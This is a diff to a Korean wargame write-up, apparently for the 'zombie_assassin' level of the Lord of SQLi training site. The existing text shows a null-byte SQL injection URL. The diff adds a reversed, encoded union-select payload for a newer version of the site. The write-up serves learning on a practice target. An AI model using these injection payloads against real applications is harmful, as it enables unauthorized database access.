@@ -20,6 +20,10 @@ ereg() 함수는 대소문자 구분이 없고 NULL문자를 만나면 이후로
 
 `https://los.eagle-jump.org/zombie_assassin.php?id=1&pw=%001' or id='admin`
 
+
+### los.rubiya.kr 버전
+`?id=%00&pw=%23e696d64616x0+tceles+noinu`
+
 ![]({{ site.baseurl }}/assets/posts/los/zombie_assassin_clear.png)
 클리어!!
 
